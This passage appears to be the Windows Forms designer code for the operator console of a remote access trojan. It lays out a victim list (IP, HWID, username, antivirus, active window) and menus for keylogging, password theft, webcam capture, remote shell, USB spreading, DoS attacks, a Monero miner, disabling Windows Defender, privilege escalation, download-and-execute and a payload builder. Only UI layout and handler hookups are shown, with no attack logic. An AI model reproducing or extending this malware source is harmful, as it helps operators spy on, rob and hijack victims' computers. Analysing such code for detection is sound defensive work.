		this.contextMenuThumbnail = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.sTARTToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sTOPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ThumbnailImageList = new System.Windows.Forms.ImageList(this.components);
		this.tabPage4 = new System.Windows.Forms.TabPage();
		this.listView4 = new System.Windows.Forms.ListView();
		this.columnHeader4 = new System.Windows.Forms.ColumnHeader();
		this.columnHeader5 = new System.Windows.Forms.ColumnHeader();
		this.contextMenuTasks = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.pASSWORDRECOVERYToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.downloadAndExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sENDFILETOMEMORYToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.minerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.uPDATEToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
		this.dELETETASKToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.performanceCounter1 = new System.Diagnostics.PerformanceCounter();
		this.performanceCounter2 = new System.Diagnostics.PerformanceCounter();
		this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
		this.TimerTask = new System.Windows.Forms.Timer(this.components);
		this.lv_group = new System.Windows.Forms.ColumnHeader();
		this.contextMenuClient.SuspendLayout();
		this.statusStrip1.SuspendLayout();
		this.tabControl1.SuspendLayout();
		this.tabPage1.SuspendLayout();
		this.tabPage2.SuspendLayout();
		this.contextMenuLogs.SuspendLayout();
		this.tabPage3.SuspendLayout();
		this.contextMenuThumbnail.SuspendLayout();
		this.tabPage4.SuspendLayout();
		this.contextMenuTasks.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.performanceCounter1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.performanceCounter2).BeginInit();
		base.SuspendLayout();
		this.listView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[12]
		{
			this.lv_ip, this.lv_country, this.lv_group, this.lv_hwid, this.lv_user, this.lv_os, this.lv_version, this.lv_ins, this.lv_admin, this.lv_av,
			this.lv_ping, this.lv_act
		});
		this.listView1.ContextMenuStrip = this.contextMenuClient;
		this.listView1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.listView1.FullRowSelect = true;
		this.listView1.GridLines = true;
		this.listView1.HideSelection = false;
		this.listView1.Location = new System.Drawing.Point(3, 3);
		this.listView1.Name = "listView1";
		this.listView1.ShowGroups = false;
		this.listView1.ShowItemToolTips = true;
		this.listView1.Size = new System.Drawing.Size(1287, 440);
		this.listView1.TabIndex = 0;
		this.listView1.UseCompatibleStateImageBehavior = false;
		this.listView1.View = System.Windows.Forms.View.Details;
		this.listView1.ColumnClick += new System.Windows.Forms.ColumnClickEventHandler(ListView1_ColumnClick);
		this.listView1.KeyDown += new System.Windows.Forms.KeyEventHandler(listView1_KeyDown);
		this.listView1.MouseMove += new System.Windows.Forms.MouseEventHandler(listView1_MouseMove);
		this.lv_ip.Text = "IP Address";
		this.lv_ip.Width = 121;
		this.lv_country.Text = "Country";
		this.lv_country.Width = 124;
		this.lv_hwid.Text = "HWID";
		this.lv_hwid.Width = 117;
		this.lv_user.Text = "Username";
		this.lv_user.Width = 117;
		this.lv_os.Text = "Operating System";
		this.lv_os.Width = 179;
		this.lv_version.Text = "Payload Version";
		this.lv_version.Width = 126;
		this.lv_ins.Text = "Installed";
		this.lv_ins.Width = 120;
		this.lv_admin.Text = "Privileges";
		this.lv_admin.Width = 166;
		this.lv_av.Text = "Anti-Virus Software";
		this.lv_av.Width = 136;
		this.lv_ping.Text = "Ping";
		this.lv_act.Text = "Active Window";
		this.lv_act.Width = 350;
		this.contextMenuClient.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.contextMenuClient.Items.AddRange(new System.Windows.Forms.ToolStripItem[11]
		{
			this.aBOUTToolStripMenuItem, this.toolStripSeparator2, this.sENDFILEToolStripMenuItem, this.monitoringToolStripMenuItem, this.miscellaneousToolStripMenuItem, this.extraToolStripMenuItem, this.systemToolStripMenuItem, this.toolStripSeparator1, this.serverToolStripMenuItem, this.toolStripSeparator5,
			this.bUILDERToolStripMenuItem
		});
		this.contextMenuClient.Name = "contextMenuStrip1";
		this.contextMenuClient.Size = new System.Drawing.Size(203, 278);
		this.aBOUTToolStripMenuItem.Image = Server.Properties.Resources.info;
		this.aBOUTToolStripMenuItem.Name = "aBOUTToolStripMenuItem";
		this.aBOUTToolStripMenuItem.Size = new System.Drawing.Size(202, 32);
		this.aBOUTToolStripMenuItem.Text = "ABOUT";
		this.aBOUTToolStripMenuItem.Click += new System.EventHandler(ABOUTToolStripMenuItem_Click);
		this.toolStripSeparator2.Name = "toolStripSeparator2";
		this.toolStripSeparator2.Size = new System.Drawing.Size(199, 6);
		this.sENDFILEToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.tOMEMORYToolStripMenuItem, this.tODISKToolStripMenuItem });
		this.sENDFILEToolStripMenuItem.Image = Server.Properties.Resources.tomem;
		this.sENDFILEToolStripMenuItem.Name = "sENDFILEToolStripMenuItem";
		this.sENDFILEToolStripMenuItem.Size = new System.Drawing.Size(202, 32);
		this.sENDFILEToolStripMenuItem.Text = "Send File";
		this.tOMEMORYToolStripMenuItem.Image = Server.Properties.Resources.tomem1;
		this.tOMEMORYToolStripMenuItem.Name = "tOMEMORYToolStripMenuItem";
		this.tOMEMORYToolStripMenuItem.Size = new System.Drawing.Size(206, 34);
		this.tOMEMORYToolStripMenuItem.Text = "To Memory";
		this.tOMEMORYToolStripMenuItem.Click += new System.EventHandler(TOMEMORYToolStripMenuItem_Click);
		this.tODISKToolStripMenuItem.Image = Server.Properties.Resources.tomem1;
		this.tODISKToolStripMenuItem.Name = "tODISKToolStripMenuItem";
		this.tODISKToolStripMenuItem.Size = new System.Drawing.Size(206, 34);
		this.tODISKToolStripMenuItem.Text = "To Disk";
		this.tODISKToolStripMenuItem.Click += new System.EventHandler(TODISKToolStripMenuItem_Click);
		this.monitoringToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[7] { this.remoteDesktopToolStripMenuItem1, this.keyloggerToolStripMenuItem1, this.passwordRecoveryToolStripMenuItem1, this.fileManagerToolStripMenuItem1, this.processManagerToolStripMenuItem1, this.reportWindowToolStripMenuItem, this.webcamToolStripMenuItem });
		this.monitoringToolStripMenuItem.Image = Server.Properties.Resources.monitoring_system;
		this.monitoringToolStripMenuItem.Name = "monitoringToolStripMenuItem";
		this.monitoringToolStripMenuItem.Size = new System.Drawing.Size(202, 32);
		this.monitoringToolStripMenuItem.Text = "Monitoring";
		this.remoteDesktopToolStripMenuItem1.Image = Server.Properties.Resources.remotedesktop;
		this.remoteDesktopToolStripMenuItem1.Name = "remoteDesktopToolStripMenuItem1";
		this.remoteDesktopToolStripMenuItem1.Size = new System.Drawing.Size(267, 34);
		this.remoteDesktopToolStripMenuItem1.Text = "Remote Desktop";
		this.remoteDesktopToolStripMenuItem1.Click += new System.EventHandler(RemoteDesktopToolStripMenuItem1_Click);
		this.keyloggerToolStripMenuItem1.Image = Server.Properties.Resources.logger;
		this.keyloggerToolStripMenuItem1.Name = "keyloggerToolStripMenuItem1";
		this.keyloggerToolStripMenuItem1.Size = new System.Drawing.Size(267, 34);
		this.keyloggerToolStripMenuItem1.Text = "Keylogger";
		this.keyloggerToolStripMenuItem1.Click += new System.EventHandler(KeyloggerToolStripMenuItem1_Click);
		this.passwordRecoveryToolStripMenuItem1.Image = Server.Properties.Resources.key;
		this.passwordRecoveryToolStripMenuItem1.Name = "passwordRecoveryToolStripMenuItem1";
		this.passwordRecoveryToolStripMenuItem1.Size = new System.Drawing.Size(267, 34);
		this.passwordRecoveryToolStripMenuItem1.Text = "Password Recovery";
		this.passwordRecoveryToolStripMenuItem1.Click += new System.EventHandler(PasswordRecoveryToolStripMenuItem1_Click);
		this.fileManagerToolStripMenuItem1.Image = Server.Properties.Resources.filemanager;
		this.fileManagerToolStripMenuItem1.Name = "fileManagerToolStripMenuItem1";
		this.fileManagerToolStripMenuItem1.Size = new System.Drawing.Size(267, 34);
		this.fileManagerToolStripMenuItem1.Text = "File Manager";
		this.fileManagerToolStripMenuItem1.Click += new System.EventHandler(FileManagerToolStripMenuItem1_Click);
		this.processManagerToolStripMenuItem1.Image = Server.Properties.Resources.process;
		this.processManagerToolStripMenuItem1.Name = "processManagerToolStripMenuItem1";
		this.processManagerToolStripMenuItem1.Size = new System.Drawing.Size(267, 34);
		this.processManagerToolStripMenuItem1.Text = "Process Manager";
		this.processManagerToolStripMenuItem1.Click += new System.EventHandler(ProcessManagerToolStripMenuItem1_Click);
		this.reportWindowToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.runToolStripMenuItem1, this.stopToolStripMenuItem2 });
		this.reportWindowToolStripMenuItem.Image = Server.Properties.Resources.report;
		this.reportWindowToolStripMenuItem.Name = "reportWindowToolStripMenuItem";
		this.reportWindowToolStripMenuItem.Size = new System.Drawing.Size(267, 34);
		this.reportWindowToolStripMenuItem.Text = "Report Window";
		this.runToolStripMenuItem1.Name = "runToolStripMenuItem1";
		this.runToolStripMenuItem1.Size = new System.Drawing.Size(152, 34);
		this.runToolStripMenuItem1.Text = "Run";
		this.runToolStripMenuItem1.Click += new System.EventHandler(RunToolStripMenuItem1_Click);
		this.stopToolStripMenuItem2.Name = "stopToolStripMenuItem2";
		this.stopToolStripMenuItem2.Size = new System.Drawing.Size(152, 34);
		this.stopToolStripMenuItem2.Text = "Stop";
		this.stopToolStripMenuItem2.Click += new System.EventHandler(StopToolStripMenuItem2_Click);
		this.webcamToolStripMenuItem.Image = Server.Properties.Resources.webcam;
		this.webcamToolStripMenuItem.Name = "webcamToolStripMenuItem";
		this.webcamToolStripMenuItem.Size = new System.Drawing.Size(267, 34);
		this.webcamToolStripMenuItem.Text = "Webcam";
		this.webcamToolStripMenuItem.Click += new System.EventHandler(WebcamToolStripMenuItem_Click);
		this.miscellaneousToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[8] { this.botsKillerToolStripMenuItem, this.uSBSpreadToolStripMenuItem1, this.seedTorrentToolStripMenuItem1, this.remoteShellToolStripMenuItem1, this.dOSAttackToolStripMenuItem, this.executeNETCodeToolStripMenuItem, this.xMRMinerToolStripMenuItem, this.filesSearcherToolStripMenuItem });
		this.miscellaneousToolStripMenuItem.Image = Server.Properties.Resources.Miscellaneous;
		this.miscellaneousToolStripMenuItem.Name = "miscellaneousToolStripMenuItem";
		this.miscellaneousToolStripMenuItem.Size = new System.Drawing.Size(202, 32);
		this.miscellaneousToolStripMenuItem.Text = "Miscellaneous";
		this.botsKillerToolStripMenuItem.Image = Server.Properties.Resources.botkiller;
		this.botsKillerToolStripMenuItem.Name = "botsKillerToolStripMenuItem";
		this.botsKillerToolStripMenuItem.Size = new System.Drawing.Size(260, 34);
		this.botsKillerToolStripMenuItem.Text = "Bots Killer";
		this.botsKillerToolStripMenuItem.Click += new System.EventHandler(BotsKillerToolStripMenuItem_Click);
		this.uSBSpreadToolStripMenuItem1.Image = Server.Properties.Resources.usb;
		this.uSBSpreadToolStripMenuItem1.Name = "uSBSpreadToolStripMenuItem1";
		this.uSBSpreadToolStripMenuItem1.Size = new System.Drawing.Size(260, 34);
		this.uSBSpreadToolStripMenuItem1.Text = "USB Spread";
		this.uSBSpreadToolStripMenuItem1.Click += new System.EventHandler(USBSpreadToolStripMenuItem1_Click);
		this.seedTorrentToolStripMenuItem1.Image = Server.Properties.Resources.u_torrent_logo;
		this.seedTorrentToolStripMenuItem1.Name = "seedTorrentToolStripMenuItem1";
		this.seedTorrentToolStripMenuItem1.Size = new System.Drawing.Size(260, 34);
		this.seedTorrentToolStripMenuItem1.Text = "Seed Torrent";
		this.seedTorrentToolStripMenuItem1.Click += new System.EventHandler(SeedTorrentToolStripMenuItem1_Click_1);
		this.remoteShellToolStripMenuItem1.Image = Server.Properties.Resources.shell;
		this.remoteShellToolStripMenuItem1.Name = "remoteShellToolStripMenuItem1";
		this.remoteShellToolStripMenuItem1.Size = new System.Drawing.Size(260, 34);
		this.remoteShellToolStripMenuItem1.Text = "Remote Shell";
		this.remoteShellToolStripMenuItem1.Click += new System.EventHandler(RemoteShellToolStripMenuItem1_Click_1);
		this.dOSAttackToolStripMenuItem.Image = Server.Properties.Resources.ddos;
		this.dOSAttackToolStripMenuItem.Name = "dOSAttackToolStripMenuItem";
		this.dOSAttackToolStripMenuItem.Size = new System.Drawing.Size(260, 34);
		this.dOSAttackToolStripMenuItem.Text = "DOS Attack";
		this.dOSAttackToolStripMenuItem.Click += new System.EventHandler(DOSAttackToolStripMenuItem_Click_1);
		this.executeNETCodeToolStripMenuItem.Image = Server.Properties.Resources.coding;
		this.executeNETCodeToolStripMenuItem.Name = "executeNETCodeToolStripMenuItem";
		this.executeNETCodeToolStripMenuItem.Size = new System.Drawing.Size(260, 34);
		this.executeNETCodeToolStripMenuItem.Text = "Execute .NET Code";
		this.executeNETCodeToolStripMenuItem.Click += new System.EventHandler(ExecuteNETCodeToolStripMenuItem_Click_1);
		this.xMRMinerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.runToolStripMenuItem, this.killToolStripMenuItem });
		this.xMRMinerToolStripMenuItem.Image = Server.Properties.Resources.xmr;
		this.xMRMinerToolStripMenuItem.Name = "xMRMinerToolStripMenuItem";
		this.xMRMinerToolStripMenuItem.Size = new System.Drawing.Size(260, 34);
		this.xMRMinerToolStripMenuItem.Text = "XMR Miner";
		this.xMRMinerToolStripMenuItem.Visible = false;
		this.runToolStripMenuItem.Image = Server.Properties.Resources.play_button;
		this.runToolStripMenuItem.Name = "runToolStripMenuItem";
		this.runToolStripMenuItem.Size = new System.Drawing.Size(152, 34);
		this.runToolStripMenuItem.Text = "Run";
		this.runToolStripMenuItem.Click += new System.EventHandler(RunToolStripMenuItem_Click);
		this.killToolStripMenuItem.Image = Server.Properties.Resources.stop__1_;
		this.killToolStripMenuItem.Name = "killToolStripMenuItem";
		this.killToolStripMenuItem.Size = new System.Drawing.Size(152, 34);
		this.killToolStripMenuItem.Text = "Stop";
		this.killToolStripMenuItem.Click += new System.EventHandler(KillToolStripMenuItem_Click);
		this.filesSearcherToolStripMenuItem.Image = Server.Properties.Resources.report;
		this.filesSearcherToolStripMenuItem.Name = "filesSearcherToolStripMenuItem";
		this.filesSearcherToolStripMenuItem.Size = new System.Drawing.Size(260, 34);
		this.filesSearcherToolStripMenuItem.Text = "Files Searcher";
		this.filesSearcherToolStripMenuItem.Click += new System.EventHandler(filesSearcherToolStripMenuItem_Click);
		this.extraToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[7] { this.visitWebsiteToolStripMenuItem1, this.sendMessageBoxToolStripMenuItem1, this.chatToolStripMenuItem1, this.getAdminPrivilegesToolStripMenuItem, this.blankScreenToolStripMenuItem, this.disableWindowsDefenderToolStripMenuItem, this.setWallpaperToolStripMenuItem });
		this.extraToolStripMenuItem.Image = Server.Properties.Resources.extra;
		this.extraToolStripMenuItem.Name = "extraToolStripMenuItem";
		this.extraToolStripMenuItem.Size = new System.Drawing.Size(202, 32);
		this.extraToolStripMenuItem.Text = "Extra";
		this.visitWebsiteToolStripMenuItem1.Image = Server.Properties.Resources.visit;
		this.visitWebsiteToolStripMenuItem1.Name = "visitWebsiteToolStripMenuItem1";
		this.visitWebsiteToolStripMenuItem1.Size = new System.Drawing.Size(329, 34);
		this.visitWebsiteToolStripMenuItem1.Text = "Visit Website";
		this.visitWebsiteToolStripMenuItem1.Click += new System.EventHandler(VisitWebsiteToolStripMenuItem1_Click);
		this.sendMessageBoxToolStripMenuItem1.Image = Server.Properties.Resources.msgbox;
		this.sendMessageBoxToolStripMenuItem1.Name = "sendMessageBoxToolStripMenuItem1";
		this.sendMessageBoxToolStripMenuItem1.Size = new System.Drawing.Size(329, 34);
		this.sendMessageBoxToolStripMenuItem1.Text = "Send MessageBox";
		this.sendMessageBoxToolStripMenuItem1.Click += new System.EventHandler(SendMessageBoxToolStripMenuItem1_Click);
		this.chatToolStripMenuItem1.Image = Server.Properties.Resources.chat;
		this.chatToolStripMenuItem1.Name = "chatToolStripMenuItem1";
		this.chatToolStripMenuItem1.Size = new System.Drawing.Size(329, 34);
		this.chatToolStripMenuItem1.Text = "Chat";
		this.chatToolStripMenuItem1.Click += new System.EventHandler(ChatToolStripMenuItem1_Click);
		this.getAdminPrivilegesToolStripMenuItem.Image = Server.Properties.Resources.uac;
		this.getAdminPrivilegesToolStripMenuItem.Name = "getAdminPrivilegesToolStripMenuItem";
		this.getAdminPrivilegesToolStripMenuItem.Size = new System.Drawing.Size(329, 34);
		this.getAdminPrivilegesToolStripMenuItem.Text = "Get Admin Privileges";
		this.getAdminPrivilegesToolStripMenuItem.Click += new System.EventHandler(GetAdminPrivilegesToolStripMenuItem_Click_1);
		this.blankScreenToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.runToolStripMenuItem2, this.stopToolStripMenuItem1 });
		this.blankScreenToolStripMenuItem.Image = Server.Properties.Resources.blank_screen;
		this.blankScreenToolStripMenuItem.Name = "blankScreenToolStripMenuItem";
		this.blankScreenToolStripMenuItem.Size = new System.Drawing.Size(329, 34);
		this.blankScreenToolStripMenuItem.Text = "Blank Screen";
		this.runToolStripMenuItem2.Image = Server.Properties.Resources.play_button;
		this.runToolStripMenuItem2.Name = "runToolStripMenuItem2";
		this.runToolStripMenuItem2.Size = new System.Drawing.Size(152, 34);
		this.runToolStripMenuItem2.Text = "Run";
		this.runToolStripMenuItem2.Click += new System.EventHandler(RunToolStripMenuItem2_Click);
		this.stopToolStripMenuItem1.Image = Server.Properties.Resources.stop__1_;
		this.stopToolStripMenuItem1.Name = "stopToolStripMenuItem1";
		this.stopToolStripMenuItem1.Size = new System.Drawing.Size(152, 34);
		this.stopToolStripMenuItem1.Text = "Stop";
		this.stopToolStripMenuItem1.Click += new System.EventHandler(StopToolStripMenuItem1_Click);
		this.disableWindowsDefenderToolStripMenuItem.Image = Server.Properties.Resources.disabled;
		this.disableWindowsDefenderToolStripMenuItem.Name = "disableWindowsDefenderToolStripMenuItem";
		this.disableWindowsDefenderToolStripMenuItem.Size = new System.Drawing.Size(329, 34);
		this.disableWindowsDefenderToolStripMenuItem.Text = "Disable Windows Defender";
		this.disableWindowsDefenderToolStripMenuItem.Click += new System.EventHandler(DisableWindowsDefenderToolStripMenuItem_Click_1);
		this.setWallpaperToolStripMenuItem.Image = Server.Properties.Resources.iconfinder_32_171485__1_;
		this.setWallpaperToolStripMenuItem.Name = "setWallpaperToolStripMenuItem";
		this.setWallpaperToolStripMenuItem.Size = new System.Drawing.Size(329, 34);
		this.setWallpaperToolStripMenuItem.Text = "Set Wallpaper";
		this.setWallpaperToolStripMenuItem.Click += new System.EventHandler(setWallpaperToolStripMenuItem_Click);
		this.systemToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.clientToolStripMenuItem, this.pCToolStripMenuItem });
		this.systemToolStripMenuItem.Image = Server.Properties.Resources.system;
		this.systemToolStripMenuItem.Name = "systemToolStripMenuItem";
		this.systemToolStripMenuItem.Size = new System.Drawing.Size(202, 32);
		this.systemToolStripMenuItem.Text = "System";
		this.clientToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.closeToolStripMenuItem1, this.restartToolStripMenuItem2, this.updateToolStripMenuItem2, this.uninstallToolStripMenuItem, this.toolStripSeparator3, this.showFolderToolStripMenuItem });
		this.clientToolStripMenuItem.Image = Server.Properties.Resources.client;
		this.clientToolStripMenuItem.Name = "clientToolStripMenuItem";
		this.clientToolStripMenuItem.Size = new System.Drawing.Size(158, 34);
		this.clientToolStripMenuItem.Text = "Client";
		this.closeToolStripMenuItem1.Name = "closeToolStripMenuItem1";
		this.closeToolStripMenuItem1.Size = new System.Drawing.Size(213, 34);
		this.closeToolStripMenuItem1.Text = "Close";
		this.closeToolStripMenuItem1.Click += new System.EventHandler(CloseToolStripMenuItem1_Click);
		this.restartToolStripMenuItem2.Name = "restartToolStripMenuItem2";
		this.restartToolStripMenuItem2.Size = new System.Drawing.Size(213, 34);
		this.restartToolStripMenuItem2.Text = "Restart";
		this.restartToolStripMenuItem2.Click += new System.EventHandler(RestartToolStripMenuItem2_Click);
		this.updateToolStripMenuItem2.Name = "updateToolStripMenuItem2";
		this.updateToolStripMenuItem2.Size = new System.Drawing.Size(213, 34);
		this.updateToolStripMenuItem2.Text = "Update";
		this.updateToolStripMenuItem2.Click += new System.EventHandler(UpdateToolStripMenuItem2_Click);
		this.uninstallToolStripMenuItem.Name = "uninstallToolStripMenuItem";
		this.uninstallToolStripMenuItem.Size = new System.Drawing.Size(213, 34);
		this.uninstallToolStripMenuItem.Text = "Uninstall";
		this.uninstallToolStripMenuItem.Click += new System.EventHandler(UninstallToolStripMenuItem_Click);
		this.toolStripSeparator3.Name = "toolStripSeparator3";
		this.toolStripSeparator3.Size = new System.Drawing.Size(210, 6);
		this.showFolderToolStripMenuItem.Name = "showFolderToolStripMenuItem";
		this.showFolderToolStripMenuItem.Size = new System.Drawing.Size(213, 34);
		this.showFolderToolStripMenuItem.Text = "Show Folder";
		this.showFolderToolStripMenuItem.Click += new System.EventHandler(ShowFolderToolStripMenuItem_Click);
		this.pCToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.logoffToolStripMenuItem1, this.restartToolStripMenuItem3, this.shutdownToolStripMenuItem1 });
		this.pCToolStripMenuItem.Image = Server.Properties.Resources.pc;
		this.pCToolStripMenuItem.Name = "pCToolStripMenuItem";
		this.pCToolStripMenuItem.Size = new System.Drawing.Size(158, 34);
		this.pCToolStripMenuItem.Text = "PC";
		this.logoffToolStripMenuItem1.Name = "logoffToolStripMenuItem1";
		this.logoffToolStripMenuItem1.Size = new System.Drawing.Size(195, 34);
		this.logoffToolStripMenuItem1.Text = "Logoff";
		this.logoffToolStripMenuItem1.Click += new System.EventHandler(LogoffToolStripMenuItem1_Click);
		this.restartToolStripMenuItem3.Name = "restartToolStripMenuItem3";
		this.restartToolStripMenuItem3.Size = new System.Drawing.Size(195, 34);
		this.restartToolStripMenuItem3.Text = "Restart";
		this.restartToolStripMenuItem3.Click += new System.EventHandler(RestartToolStripMenuItem3_Click);
		this.shutdownToolStripMenuItem1.Name = "shutdownToolStripMenuItem1";
		this.shutdownToolStripMenuItem1.Size = new System.Drawing.Size(195, 34);
		this.shutdownToolStripMenuItem1.Text = "Shutdown";
		this.shutdownToolStripMenuItem1.Click += new System.EventHandler(ShutdownToolStripMenuItem1_Click);
		this.toolStripSeparator1.Name = "toolStripSeparator1";
		this.toolStripSeparator1.Size = new System.Drawing.Size(199, 6);
		this.serverToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.blockClientsToolStripMenuItem });
		this.serverToolStripMenuItem.Image = Server.Properties.Resources.server;
		this.serverToolStripMenuItem.Name = "serverToolStripMenuItem";
		this.serverToolStripMenuItem.Size = new System.Drawing.Size(202, 32);
		this.serverToolStripMenuItem.Text = "Server";
		this.blockClientsToolStripMenuItem.Image = Server.Properties.Resources.disabled;
		this.blockClientsToolStripMenuItem.Name = "blockClientsToolStripMenuItem";
		this.blockClientsToolStripMenuItem.Size = new System.Drawing.Size(213, 34);
		this.blockClientsToolStripMenuItem.Text = "Block Clients";
		this.blockClientsToolStripMenuItem.Click += new System.EventHandler(BlockClientsToolStripMenuItem_Click);
		this.toolStripSeparator5.Name = "toolStripSeparator5";
		this.toolStripSeparator5.Size = new System.Drawing.Size(199, 6);
		this.bUILDERToolStripMenuItem.Image = Server.Properties.Resources.builder;
		this.bUILDERToolStripMenuItem.Name = "bUILDERToolStripMenuItem";
		this.bUILDERToolStripMenuItem.Size = new System.Drawing.Size(202, 32);
		this.bUILDERToolStripMenuItem.Text = "BUILDER";
		this.bUILDERToolStripMenuItem.Click += new System.EventHandler(bUILDERToolStripMenuItem_Click);
		this.statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripStatusLabel2, this.toolStripStatusLabel1 });
		this.statusStrip1.Location = new System.Drawing.Point(0, 479);
		this.statusStrip1.Name = "statusStrip1";
		this.statusStrip1.Size = new System.Drawing.Size(1301, 32);
		this.statusStrip1.TabIndex = 1;
		this.statusStrip1.Text = "statusStrip1";
		this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
		this.toolStripStatusLabel2.Size = new System.Drawing.Size(179, 25);
		this.toolStripStatusLabel2.Text = "[Notification]             ";
		this.toolStripStatusLabel2.Click += new System.EventHandler(ToolStripStatusLabel2_Click);
		this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
		this.toolStripStatusLabel1.Size = new System.Drawing.Size(24, 25);
		this.toolStripStatusLabel1.Text = "...";
		this.ping.Enabled = true;
		this.ping.Interval = 30000;
		this.ping.Tick += new System.EventHandler(ping_Tick);
		this.UpdateUI.Enabled = true;
		this.UpdateUI.Interval = 500;
		this.UpdateUI.Tick += new System.EventHandler(UpdateUI_Tick);
		this.tabControl1.Controls.Add(this.tabPage1);
		this.tabControl1.Controls.Add(this.tabPage2);
		this.tabControl1.Controls.Add(this.tabPage3);
		this.tabControl1.Controls.Add(this.tabPage4);
		this.tabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.tabControl1.Location = new System.Drawing.Point(0, 0);
		this.tabControl1.Name = "tabControl1";
		this.tabControl1.SelectedIndex = 0;
		this.tabControl1.Size = new System.Drawing.Size(1301, 479);
		this.tabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
		this.tabControl1.TabIndex = 2;
		this.tabPage1.Controls.Add(this.listView1);
		this.tabPage1.Location = new System.Drawing.Point(4, 29);
		this.tabPage1.Name = "tabPage1";
		this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage1.Size = new System.Drawing.Size(1293, 446);
		this.tabPage1.TabIndex = 0;
		this.tabPage1.Text = "Clients";
		this.tabPage2.Controls.Add(this.listView2);
		this.tabPage2.Location = new System.Drawing.Point(4, 29);
		this.tabPage2.Name = "tabPage2";
		this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage2.Size = new System.Drawing.Size(1293, 446);
		this.tabPage2.TabIndex = 1;
		this.tabPage2.Text = "Logs";
		this.tabPage2.UseVisualStyleBackColor = true;
		this.listView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.listView2.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.columnHeader1, this.columnHeader2 });
		this.listView2.ContextMenuStrip = this.contextMenuLogs;
		this.listView2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.listView2.FullRowSelect = true;
		this.listView2.GridLines = true;
		this.listView2.HideSelection = false;
		this.listView2.Location = new System.Drawing.Point(3, 3);
		this.listView2.Name = "listView2";
		this.listView2.ShowGroups = false;
		this.listView2.ShowItemToolTips = true;
		this.listView2.Size = new System.Drawing.Size(1287, 440);
		this.listView2.TabIndex = 1;
		this.listView2.UseCompatibleStateImageBehavior = false;
		this.listView2.View = System.Windows.Forms.View.Details;
		this.columnHeader1.Text = "Time";
		this.columnHeader1.Width = 150;
		this.columnHeader2.Text = "Message";
		this.columnHeader2.Width = 1078;
		this.contextMenuLogs.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.contextMenuLogs.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.cLEARToolStripMenuItem });
		this.contextMenuLogs.Name = "contextMenuLogs";
		this.contextMenuLogs.ShowImageMargin = false;
		this.contextMenuLogs.Size = new System.Drawing.Size(111, 36);
		this.cLEARToolStripMenuItem.Name = "cLEARToolStripMenuItem";
		this.cLEARToolStripMenuItem.Size = new System.Drawing.Size(110, 32);
		this.cLEARToolStripMenuItem.Text = "CLEAR";
		this.cLEARToolStripMenuItem.Click += new System.EventHandler(CLEARToolStripMenuItem_Click);
		this.tabPage3.Controls.Add(this.listView3);
		this.tabPage3.Location = new System.Drawing.Point(4, 29);
		this.tabPage3.Name = "tabPage3";
		this.tabPage3.Size = new System.Drawing.Size(1293, 446);
		this.tabPage3.TabIndex = 2;
		this.tabPage3.Text = "Thumbnail";
		this.tabPage3.UseVisualStyleBackColor = true;
		this.listView3.ContextMenuStrip = this.contextMenuThumbnail;
		this.listView3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.listView3.HideSelection = false;
		this.listView3.LargeImageList = this.ThumbnailImageList;
		this.listView3.Location = new System.Drawing.Point(0, 0);
		this.listView3.Name = "listView3";
		this.listView3.ShowItemToolTips = true;
		this.listView3.Size = new System.Drawing.Size(1293, 446);
		this.listView3.SmallImageList = this.ThumbnailImageList;
		this.listView3.TabIndex = 0;
		this.listView3.UseCompatibleStateImageBehavior = false;
		this.contextMenuThumbnail.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.contextMenuThumbnail.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.sTARTToolStripMenuItem, this.sTOPToolStripMenuItem });
		this.contextMenuThumbnail.Name = "contextMenuStrip2";
		this.contextMenuThumbnail.Size = new System.Drawing.Size(144, 68);
		this.sTARTToolStripMenuItem.Image = Server.Properties.Resources.play_button;
